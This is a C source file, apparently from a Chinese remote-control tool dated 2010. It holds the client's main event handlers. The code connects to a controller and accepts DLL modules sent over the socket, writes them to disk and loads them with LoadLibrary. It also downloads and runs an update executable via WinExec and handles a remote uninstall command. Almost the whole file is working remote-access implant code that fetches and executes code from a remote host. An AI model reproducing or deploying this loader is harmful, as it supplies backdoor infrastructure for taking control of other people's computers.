/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "km_main_event.h"

kms_event_func event_funcs[] = {
    kms_main_update,
    kms_main_module,
    kms_main_recv_module,
    kms_main_close,
    NULL,   //initialize.dll send pclient
    kms_main_check,
    kms_main_uninstall
};

extern pio_socket main_soskcet;
extern u_long main_time;

static void
kms_module_check(pio_socket i_socket)
{
    int i;
    char mod_path[MAX_PATH];
    kms_initialize_module initialize_module;
    for (i=0; i<g_share_main->km_module_count; i++) {
        if (g_share_main->km_modules[i].hModule != NULL)
            continue;

        memset(mod_path, 0x0, MAX_PATH);
        sprintf(mod_path, "%s%x%s", g_share_main->km_mod_path, (int)g_share_main->km_modules[i].crc32, ".tmp");
        //printf("%s\n", mod_path);

        if (GetFileAttributes(mod_path) != -1) {
            if (g_share_main->km_modules[i].majorcmd == 1) {
                g_share_main->km_modules[i].hModule = (HANDLE)0x10101010;
                continue;
            }
            g_share_main->km_modules[i].hModule = LoadLibrary(mod_path);
            if (g_share_main->km_modules[i].hModule == NULL) {
                kms_sock_send(i_socket, 0, 2, g_share_main->km_modules[i].crc32, NULL, 0);
                return;
            }
            initialize_module = (kms_initialize_module)GetProcAddress(g_share_main->km_modules[i].hModule, "initialize");
            if (initialize_module == NULL) {
                FreeLibrary(g_share_main->km_modules[i].hModule);
                g_share_main->km_modules[i].hModule = NULL;
                kms_sock_send(i_socket, 0, 2, g_share_main->km_modules[i].crc32, NULL, 0);
                return;
            }
            initialize_module(g_share_main);
        } else {
            kms_sock_send(i_socket, 0, 2, g_share_main->km_modules[i].crc32, NULL, 0);
            return;
        }
    }
    kms_sock_send(i_socket, 0, 5, 0, NULL, 0);
    return;
}

int
kms_file_write(char *path,char *buffer,int length)
{
    //printf("kms_file_write\n");
    HANDLE hFile;
    DWORD dwWriteBytes;
    hFile = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, NULL,  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == 0)
        return 0;
    WriteFile(hFile, buffer, length, &dwWriteBytes, NULL);
    CloseHandle(hFile);
    return dwWriteBytes;
}

int
km_main_connect(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped)
{
    if (ret == 0) {
        Sleep(10);
        return SOCK_LOOP_RE_COUNT;
    }

    main_soskcet = i_socket;

    g_share_main->event_funcs[0].event_funcs = event_funcs;
    g_share_main->event_funcs[0].count = 7;

    i_socket->f_call_work = (void*)km_main_parse;

    i_socket->i_length = g_share_main->km_length;
    i_socket->i_buffer = g_share_main->km_buffer;

    kms_sock_send(i_socket, 0, 0, 0, (char*)&g_share_main->c_ver, sizeof(client_ver));

    return SOCK_LOOP_RECV_HEADER;
}

int
km_main_parse(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped)
{
    pio_data_header pi_data_header;

    if ( (ret == 0) || (dwTrans == 0) ) {
        goto _exit_err;
    }
    i_socket->r_count += dwTrans;
    if (i_socket->r_count < sizeof(io_data_header)) {
        i_socket->r_buf.buf = i_socket->i_buffer + i_socket->r_count;
        i_socket->r_buf.len = sizeof(io_data_header) - i_socket->r_count;
        return SOCK_LOOP_RECV_NEXT;
    }
    pi_data_header = (pio_data_header)i_socket->i_buffer;
    if (i_socket->r_count < pi_data_header->length) {
        i_socket->r_buf.buf = i_socket->i_buffer + i_socket->r_count;
        i_socket->r_buf.len = pi_data_header->length - i_socket->r_count;
        return SOCK_LOOP_RECV_NEXT;
    }
    i_socket->i_buffer[i_socket->r_count] = '\0';

    //printf("%d:%d %d:%d\n", ret, (int)dwTrans, pi_data_header->major_cmd, pi_data_header->minor_cmd);
    return g_share_main->event_funcs[pi_data_header->major_cmd].event_funcs[pi_data_header->minor_cmd]
                                (i_socket, i_socket->i_buffer, i_socket->r_count);
_exit_err:
    return SOCK_LOOP_CLOSE;
}

int
kms_main_update(pio_socket i_socket, char *buffer, int lengthdd)
{
    //printf("%s\n","kms_main_update");
    pio_data_header pi_data_header = (pio_data_header)buffer;
    char exepath[MAX_PATH] = {0};
    char exec[1024]        = {0};
    unsigned long length;
    length = pi_data_header->length - sizeof(io_data_header);

    sprintf(exepath,"%s%s", g_share_main->km_cur_path, "t.exe");
    kms_file_write(exepath, buffer + sizeof(io_data_header), length);
    sprintf(exec,"%s update", exepath);
    WinExec(exec, 0);

    ExitProcess(-1);
    return SOCK_LOOP_CLOSE;
}

int
kms_main_module(pio_socket i_socket, char *buffer, int length)
{
    int i;
    pio_data_header pi_data_header = (pio_data_header)buffer;
    pkm_recv_module precv_module = (pkm_recv_module)(buffer + sizeof(io_data_header));

    g_share_main->km_module_count = (pi_data_header->length - sizeof(io_data_header)) / sizeof(km_recv_module);

    g_share_main->km_modules = malloc(sizeof(km_module) * g_share_main->km_module_count);
    memset(g_share_main->km_modules, 0x0, sizeof(km_module) * g_share_main->km_module_count);

    for (i=0; i<g_share_main->km_module_count; i++) {
        g_share_main->km_modules[i].crc32 = precv_module[i].crc32;
        g_share_main->km_modules[i].majorcmd = precv_module[i].majorcmd;
        //printf("mod:%x\n", (int)precv_module[i].crc32);
    }
    //Sleep(10000);
    kms_module_check(i_socket);

    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_recv_module(pio_socket i_socket, char *buffer, int length)
{
    char mod_path[MAX_PATH] = {0};
    char *file_buffer = buffer + sizeof(io_data_header);
    pio_data_header pi_data_header = (pio_data_header)buffer;
    sprintf(mod_path, "%s%x%s", g_share_main->km_mod_path, (int)pi_data_header->crc32, ".tmp");
    //printf("%s\n", mod_path);
    kms_file_write(mod_path, file_buffer, pi_data_header->length - sizeof(io_data_header));

    kms_module_check(i_socket);
    //printf("%s\n","kms_main_recv_module");
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_close(pio_socket i_socket, char *buffer, int length)
{
    //printf("%s\n","kms_main_close");
    kms_main_destroy(i_socket);
    closesocket(i_socket->socket);
    return SOCK_LOOP_RE_COUNT;
}

int kms_main_uninstall(pio_socket i_socket, char *buffer, int length)
{
    char file_path[MAX_PATH];
    sprintf(file_path, "%s del", g_share_main->km_exe_path_name);
    WinExec(file_path, SW_SHOW);
    ExitProcess(-1);
    return SOCK_LOOP_CLOSE;
}

int
kms_main_check(pio_socket i_socket, char *buffer, int length)
{
    main_time = timeGetTime();
    return SOCK_LOOP_RECV_HEADER;
}

int
kms_main_destroy(pio_socket i_socket)
{
    int i;
    for (i=0; i<g_share_main->km_module_count; i++) {
        if (g_share_main->km_modules[i].hModule != NULL)
            continue;
        FreeLibrary(g_share_main->km_modules[i].hModule);
    }
    g_share_main->km_module_count = 0;
    if (g_share_main->km_modules != NULL) {
        free(g_share_main->km_modules);
        g_share_main->km_modules = NULL;
    }
    i_socket->f_call_work = i_socket->f_temp_call_work;
    return 1;
}
